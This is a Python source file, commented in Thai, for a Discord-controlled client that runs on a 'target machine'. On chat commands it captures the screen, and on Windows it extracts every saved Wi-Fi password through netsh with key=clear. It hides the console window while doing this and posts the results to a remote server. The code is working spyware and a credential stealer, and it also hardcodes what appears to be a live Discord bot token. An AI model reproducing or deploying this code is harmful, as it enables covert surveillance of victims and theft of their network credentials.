"""
Discord Cap & Wi-Fi Client
- คอยดักฟังคำสั่ง !cap และ !wifi จากช่องที่กำหนด
- ทำการดึงภาพหน้าจอ หรือรันคำสั่งดึงรหัสผ่าน Wi-Fi ในเครื่อง (เฉพาะ Windows)
- ยิงข้อมูลกลับไปหา Server ผ่าน HTTP
"""

import asyncio
import io
import os
import re
import subprocess
import time
import aiohttp
import discord
import mss
from PIL import Image
from dotenv import load_dotenv

load_dotenv()

# ============================================================
# Config (ดึงจาก .env หรือแก้ตรงนี้)
# ============================================================
BOT_TOKEN = "MTQ5NzU1MDU5NjMxODgyMjQ5MA.GiTzZF.NqSPwA8XFEEPilT8wWuTS5hwwO38eYeSIhviYw"         # ใช้ Token บอทตัวเดียวกับ Server
SERVER_URL = os.getenv("SERVER_URL", "http://localhost:8765")
API_SECRET = os.getenv("API_SECRET", "my-secret-key")
MONITOR_INDEX = int(os.getenv("MONITOR_INDEX", "1"))  # 1 = จอหลัก
WATCH_CHANNELS = os.getenv("WATCH_CHANNELS", "")     # เว้นว่างไว้คือฟังทุกห้อง, หรือใส่ "123,456"
# ============================================================


def capture_screenshot(monitor_index: int = 1) -> bytes:
    """จับภาพหน้าจอแล้วคืนค่าเป็น bytes ของรูป PNG"""
    with mss.mss() as sct:
        monitors = sct.monitors
        if monitor_index >= len(monitors):
            monitor_index = 1
        monitor = monitors[monitor_index]
        screenshot = sct.grab(monitor)

        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
        buffer = io.BytesIO()
        img.save(buffer, format="PNG", optimize=True)
        buffer.seek(0)
        return buffer.read()


def get_wifi_passwords() -> str:
    """ดึงรายชื่อ Wi-Fi และรหัสผ่านที่เคยเชื่อมต่อในเครื่อง Windows"""
    if os.name != 'nt':
        return "❌ ระบบนี้รองรับการดึงรหัส Wi-Fi เฉพาะบนระบบปฏิบัติการ Windows เท่านั้น"

    try:
        # ซ่อนหน้าต่างดำ (cmd) ไม่ให้โผล่ขึ้นมากวนใจผู้ใช้ขณะรันสคริปต์
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        # 1. ดึงรายชื่อ Profile Wi-Fi ทั้งหมดออกมาก่อน
        meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], startupinfo=si).decode('cp874', errors='ignore')
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", meta_data)
        
        if not profiles:
            return "ℹ️ ไม่พบประวัติการเชื่อมต่อ Wi-Fi ในเครื่องนี้"

        output = [f"=== Wi-Fi Password Report (Total Profiles: {len(profiles)}) ==="]
        
        # 2. ค้นหารหัสผ่านของแต่ละ Profile
        for profile in profiles:
            profile_name = profile.strip().strip('\r')
            try:
                profile_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile_name, 'key=clear'], startupinfo=si).decode('cp874', errors='ignore')
                password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
                
                if password_match:
                    password = password_match.group(1).strip().strip('\r')
                    output.append(f"SSID: {profile_name:<25} | Pass: {password}")
                else:
                    output.append(f"SSID: {profile_name:<25} | Pass: [Open Network / No Password]")
            except subprocess.CalledProcessError:
                output.append(f"SSID: {profile_name:<25} | Pass: [Error: Cannot retrieve]")
                
        return "\n".join(output)
        
    except Exception as e:
        return f"❌ เกิดข้อผิดพลาดภายในระบบ: {str(e)}"


# ==================== Network Sender ====================

async def send_screenshot_to_server(session: aiohttp.ClientSession, channel_id: int, image_bytes: bytes) -> bool:
    """ส่งภาพหน้าจอไปยัง HTTP Server"""
    url = f"{SERVER_URL}/screenshot"
    try:
        form = aiohttp.FormData()
        form.add_field("channel_id", str(channel_id))
        form.add_field("image", image_bytes, filename="screenshot.png", content_type="image/png")

        async with session.post(url, data=form, headers={"X-API-Secret": API_SECRET}, timeout=15) as resp:
            return resp.status == 200
    except Exception as e:
        print(f"[CLIENT] ❌ ไม่สามารถส่งภาพไปยัง Server: {e}")
        return False


async def send_wifi_to_server(session: aiohttp.ClientSession, channel_id: int, wifi_data: str) -> bool:
    """ส่งข้อมูล Wi-Fi ไปยัง HTTP Server"""
    url = f"{SERVER_URL}/wifi"
    try:
        payload = {"channel_id": channel_id, "wifi_data": wifi_data}
        async with session.post(url, json=payload, headers={"X-API-Secret": API_SECRET}, timeout=15) as resp:
            return resp.status == 200
    except Exception as e:
        print(f"[CLIENT] ❌ ไม่สามารถส่งข้อมูล Wi-Fi ไปยัง Server: {e}")
        return False


# ==================== Discord Core Client ====================

class CapClient(discord.Client):
    def __init__(self, watch_channel_ids: list[int]):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(intents=intents)
        self.watch_channel_ids = watch_channel_ids
        self.http_session: aiohttp.ClientSession | None = None

    async def setup_hook(self):
        self.http_session = aiohttp.ClientSession()

    async def close(self):
        if self.http_session:
            await self.http_session.close()
        await super().close()

    async def on_ready(self):
        print(f"✅ Client logged in as {self.user}")
        watching = self.watch_channel_ids or ["ทุกช่องแชท"]
        print(f"👁️  กำลังเฝ้าดูช่องแชท ID: {watching}")

    async def on_message(self, message: discord.Message):
        if message.author == self.user:
            return

        if self.watch_channel_ids and message.channel.id not in self.watch_channel_ids:
            return

        command = message.content.strip().lower()
        channel_id = message.channel.id

        # 1. จัดการคำสั่ง !cap
        if command == "!cap":
            print(f"[CLIENT] 📸 เจอคำสั่ง !cap ในช่อง {channel_id}")
            try:
                image_bytes = await asyncio.to_thread(capture_screenshot, MONITOR_INDEX)
                if self.http_session:
                    await send_screenshot_to_server(self.http_session, channel_id, image_bytes)
                    print(f"[CLIENT] ส่งภาพหน้าจอสำเร็จ")
            except Exception as e:
                print(f"[CLIENT] เกิดข้อผิดพลาดในการแคปหน้าจอ: {e}")

        # 2. จัดการคำสั่ง !wifi
        elif command == "!wifi":
            print(f"[CLIENT] 📡 เจอคำสั่ง !wifi ในช่อง {channel_id}")
            # รันคำสั่งระบบผ่าน Thread เพื่อป้องกันไม่ให้โปรแกรมค้าง
            wifi_results = await asyncio.to_thread(get_wifi_passwords)
            if self.http_session:
                await send_wifi_to_server(self.http_session, channel_id, wifi_results)
                print(f"[CLIENT] ส่งข้อมูล Wi-Fi สำเร็จ")


def main():
    if not BOT_TOKEN:
        print("❌ กรุณาตั้งค่า DISCORD_BOT_TOKEN ในไฟล์ .env")
        return

    watch_ids = []
    if WATCH_CHANNELS:
        watch_ids = [int(x.strip()) for x in WATCH_CHANNELS.split(",") if x.strip()]

    client = CapClient(watch_channel_ids=watch_ids)
    print(f"🚀 เริ่มทำงาน Client (Target Machine)...")
    client.run(BOT_TOKEN)


if __name__ == "__main__":
    main()